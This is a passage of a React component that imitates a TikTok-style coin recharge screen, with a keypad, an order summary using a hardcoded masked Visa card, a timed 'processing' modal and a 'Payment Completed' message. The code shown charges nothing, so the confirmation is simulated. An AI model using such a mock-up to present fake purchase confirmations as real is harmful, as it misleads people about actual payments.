                onClick={() => handleButtonClick("5")}
              >
                5
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleButtonClick("6")}
              >
                6
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleButtonClick("000")}
              >
                000
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleButtonClick("7")}
              >
                7
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleButtonClick("8")}
              >
                8
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleButtonClick("9")}
              >
                9
              </button>
              <button
                className="bg-gray-200 font-semibold text-xl rounded-xl py-1.5 px-2"
                onClick={() => handleButtonClick("0")}
              >
                0
              </button>
            </div>
            <div className="text-left px-3">
              <span className=" font-light ">Total:</span>{" "}
              <span className="font-bold">$ {totalPrice}</span>
            </div>
            <div className="flex w-full gap-4 px-3 items-center">
              <span>
                <svg
                  className="css-g0144v fill-gray-600"
                  width="1.5em"
                  data-e2e=""
                  height="1.5em"
                  viewBox="0 0 48 48"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    fillRule="evenodd"
                    clipRule="evenodd"
                    d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z"
                  ></path>
                </svg>
              </span>
              <button
                className="flex-grow rounded-sm hover:border-gray-50 text-white py-2 bg-[#fe2c55] hover:bg-[#ef2950]"
                onClick={() => {
                  modalRef.current.className =
                    modalRef.current.className +
                    " animate__animated animate__bounceIn";
                  setPayment(true);
                  setModal(false);
                }}
              >
                Recharge
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* ORDER SUMMARY*/}
      <div
        id="popup"
        className={
          payment
            ? "flex fixed inset-0 flex-wrap items-center justify-center bg-black bg-opacity-50 animate__animated animate__fadeIn animate__slow-1s"
            : "hidden"
        }
      >
        <div
          id="popupBox"
          className="bg-white py-5 px-1 rounded-xl w-2/3 min-h-1/3  animate__animated animate__bounceIn animate__slow-1s"
        >
          <div className="w-full h-full flex flex-col  gap-4">
            <div className=" flex w-full justify-between items-center  px-4">
              <span
                className=" text-right font-bold  cursor-pointer"
                onClick={() => {
                  setPayment(false);
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="fill-zinc-500"
                  width="24px"
                  height="24px"
                  viewBox="0 0 32 32"
                >
                  <path d="M18.8,16l5.5-5.5c0.8-0.8,0.8-2,0-2.8l0,0C24,7.3,23.5,7,23,7c-0.5,0-1,0.2-1.4,0.6L16,13.2l-5.5-5.5  c-0.8-0.8-2.1-0.8-2.8,0C7.3,8,7,8.5,7,9.1s0.2,1,0.6,1.4l5.5,5.5l-5.5,5.5C7.3,21.9,7,22.4,7,23c0,0.5,0.2,1,0.6,1.4  C8,24.8,8.5,25,9,25c0.5,0,1-0.2,1.4-0.6l5.5-5.5l5.5,5.5c0.8,0.8,2.1,0.8,2.8,0c0.8-0.8,0.8-2.1,0-2.8L18.8,16z" />
                </svg>
              </span>
              <span className="font-bold text-xl flex-grow text-center ">
                Order Summary
              </span>
            </div>
            <div className="w-full px-3 py-1 bg-gray-200 bg-opacity-30 rounded-xl items-center flex justify-between ">
              <span className="font-bold text-lg">Account</span>
              <span className="font-medium"> {username}</span>
            </div>

            <div className="w-full px-3 py-1 bg-gray-200 bg-opacity-30 rounded-xl items-center flex justify-between ">
              <span className="font-bold text-lg">{inputValue || 0} Coins</span>
              <span className="font-medium text-gray-500 ">$ {totalPrice}</span>
            </div>

            <div className="text-left">
              <span className="font-semibold text-gray-400 px-3 text-base  ">
                Select a payment method
              </span>
              <div className=" w-full px-3  py-1 bg-gray-200 bg-opacity-60 rounded-xl flex justify-between items-center">
                <div className="flex gap-2">
                  <figure className="h-6 bg-transparent">
                    <img
                      className="h-full w-full"
                      src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/visa_light_c558fb.svg"
                    ></img>
                  </figure>
                  <span className="font-semibold">************8634</span>
                </div>
                <input
                  checked
                  id="default-radio-2"
                  type="radio"
                  value=""
                  name="default-radio"
                  className="w-5 h-5 text-red-600 accent-[#fe2c55]   border-gray-300 "
                />
              </div>
            </div>
            <div className="text-left px-3">
              <span className="font-normal">Total: </span>
              <span className="font-bold ml-1"> ${totalPrice}</span>
            </div>
            <div className="flex w-full gap-4 px-3 items-center">
              <span>
                <svg
                  className="css-g0144v fill-gray-600"
                  width="1.5em"
                  data-e2e=""
                  height="1.5em"
                  viewBox="0 0 48 48"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    fillRule="evenodd"
                    clipRule="evenodd"
                    d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z"
                  ></path>
                </svg>
              </span>
              <button
                className="flex-grow rounded-sm hover:border-gray-50 text-white py-2 bg-[#fe2c55] hover:bg-[#ef2950]"
                onClick={handleStartCountdown}
              >
                Pay now
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* MODAL PAY */}
      <div
        id="popup"
        className={
          countDownModal
            ? "flex fixed inset-0  flex-wrap items-center justify-center bg-black bg-opacity-50"
            : "hidden"
        }
      >
        <div
          id="popupBox"
          className="bg-white py-5 px-1 rounded w-2/3 h-2/3 animate__animated animate__bounceIn animate__slow-1s"
        >
          <div className="w-full h-full flex flex-col items-center py-10 pb-16 gap-28">
            <div className=" flex flex-col items-center">
              <div className=" bg-gray-300 rounded-full min-w-9 min-h-9 p-3 bg-opacity-60 ">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="#000000"
                  height="32px"
                  width="32px"
                  version="1.1"
                  id="Layer_1"
                  viewBox="0 0 512 512"
                  xmlSpace="preserve"
                  className="rotated"
                >
                  <g>
                    <g>
                      <path d="M425.956,477.812h-1.489V428.64c0-4.147-1.508-8.152-4.242-11.269l-141.49-161.37L420.225,94.63    c2.734-3.117,4.242-7.122,4.242-11.27V34.188h1.49c9.44,0,17.094-7.654,17.094-17.094S435.396,0,425.956,0H86.044    C76.604,0,68.95,7.654,68.95,17.094s7.654,17.094,17.094,17.094h1.491V83.36c0,4.147,1.508,8.152,4.24,11.27l141.49,161.371    L91.775,417.37c-2.733,3.117-4.24,7.122-4.24,11.269v49.173h-1.491c-9.44,0-17.094,7.654-17.094,17.094S76.604,512,86.044,512    h339.91c9.44,0,17.094-7.654,17.094-17.094S435.396,477.812,425.956,477.812z M121.723,34.188h268.556v32.079H121.723V34.188z     M165.878,127.287l-23.527-26.832h227.299l-23.266,26.534H168.997C167.93,126.99,166.891,127.101,165.878,127.287z     M195.593,161.178h120.815l-60.408,68.894L195.593,161.178z M238.905,301.424v23.102c0.001,9.442,7.654,17.094,17.095,17.094    c9.44,0,17.094-7.654,17.094-17.094v-23.102l96.556,110.122h-227.3L238.905,301.424z M390.278,477.812H121.723v-32.079h268.556    V477.812z" />
                    </g>
                  </g>
                  <g>
                    <g>
                      <circle cx="255.999" cy="376.261" r="18.803" />
                    </g>
                  </g>
                </svg>
              </div>
              <span className="text-2xl font-bold mt-4">
                Proccessing your payment
              </span>
              <span>This could take a few seconds</span>
            </div>
            <div>
              {secondsRemaining > 3 ? (
                <span className="font-medium text-gray-500 text-lg">
                  {minutesRemaining}:{seconds}
                </span>
              ) : (
                <div className=" flex justify-center items-center ">
                  <span className="tiktok-loader"></span>
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      {/* MODAL COMPLETE PAY */}
      <div
        id="popup"
        className={
          paymentComplete
            ? "flex fixed inset-0  flex-wrap items-center justify-center bg-black bg-opacity-50"
            : "hidden"
        }
        ref={completeRef}
      >
        <div
          id="popupBox"
          className="bg-white py-5 px-1 rounded w-4/5 h-2/3 animate__animated animate__bounceIn animate_fadeIn animate__faster"
        >
          <div className=" px-4 flex h-full items-center flex-col gap-6">
            <div className="flex w-full justify-end">
              <span>
                <svg
                  className="css-g0144v fill-gray-600"
                  width="1.5em"
                  data-e2e=""
                  height="1.5em"
                  viewBox="0 0 48 48"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    fillRule="evenodd"
                    clipRule="evenodd"
                    d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z"
                  ></path>
                </svg>
              </span>
            </div>
            <div className="flex flex-col flex-grow">
              <div className="flex justify-center">
                <svg
                  className="checkmark bg-gray-400 bg-opacity-40 "
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 52 52"
                >
                  <circle
                    className="checkmark__circle"
                    cx="26"
                    cy="26"
                    r="25"
                    fill="none"
                  />
                  <path
                    className="checkmark__check"
                    fill="none"
                    d="M14.1 27.2l7.1 7.2 16.7-16.8"
                  />
                </svg>
              </div>
              <div className="flex flex-col mt-4 items-center text-center gap-4">
                <span className="font-bold text-xl">Payment Completed</span>
                <span className="w-4/5 text-lg font-normal">
                  You recharged <span className="font-bold">{inputValue}</span>{" "}
                  Coins. You can the coins to send virtual Gifts.
                </span>
              </div>
            </div>
            <div className=" w-full px-2">
              <button
                id="closeButton"
                className="bg-[#fe2c55] hover:bg-[#ef2950] text-white font-bold py-2 px-4 w-full rounded"
                onClick={() => {
                  setPaymentComplete(false);
                  setTotalPrice("0.00");
                  setInputValue("");
                  setCountDownModal(false);
                  setIsCountdownStarted(false);
                }}
              >
                OK
              </button>
            </div>
          </div>
        </div>
      </div>
    </>
  );
}

export default App;
/**
          <div className="flex flex-col justify-center items-center">
            <ul className="mt-4">
              <h1 className="text-xl my-2 font-bold">Payment Completed</h1>
              <div className="flex justify-center">
                <li className="p-1">
                  <img
                    className="h-14 w-14"
                    src="https://lf16-co.g-p-static.com/obj/pipo-sgcompliance/sky/paypal-light-border_4305a4.svg"
                  />
                </li>
              </div>
            </ul>
            <p className="mr-2 text-2xl">Payment method</p>

            <p id="worth" className="my-4 rounded-sm text-center font-bold"></p>
            <p className="my-4 rounded-sm text-blue-600 font-bold">
              Coin will be added shortly, please wait between 10 minutes to 1
              hour.
            </p>
          </div>
          <div className="flex justify-end">
            <button
              id="closeButton"
              className="bg-[#fe2c55] hover:bg-[#ef2950] text-white font-bold py-2 px-4 rounded"
            >
              OK
            </button>
          </div> */
